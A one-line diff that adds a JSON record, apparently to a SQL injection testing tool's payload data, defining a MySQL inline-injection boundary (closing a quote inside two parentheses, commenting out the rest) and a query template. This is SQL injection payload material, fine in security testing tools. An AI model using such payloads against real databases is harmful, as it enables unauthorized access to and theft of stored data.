@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "inline", "boundary": {"prefix": "'))", "suffix": "-- -", "type": "paren2-single"}, "vector": "{B} AND 1=(SELECT ({Q}))", "comment": "mysql inline: single in 2 parens"}
